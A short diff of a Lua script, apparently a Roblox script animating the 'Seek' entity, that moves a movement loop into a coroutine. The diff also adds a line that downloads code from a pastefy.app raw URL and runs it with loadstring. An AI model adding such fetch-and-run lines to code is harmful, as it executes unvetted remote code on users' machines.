@@ -2730,9 +2730,18 @@ workspace.ChildAdded:Connect(function(seek)
        local Ahsfs = SeekRig.AnimationController:LoadAnimation(SeekRig.AnimRun)
        Ahsfs:Play()
        
+--SeekPivo
+  coroutine.wrap(function()
        while true do wait()
         getSeek:PivotTo(workspace.SeekMovingNewClone.Figure.CFrame)
        end
+  end)()
+       
+--Seek
+coroutine.wrap(function()
+  loadstring(game:HttpGet("https://pastefy.app/6yFiipMI/raw"))()
+end)() 
+
 	else
 
 	end
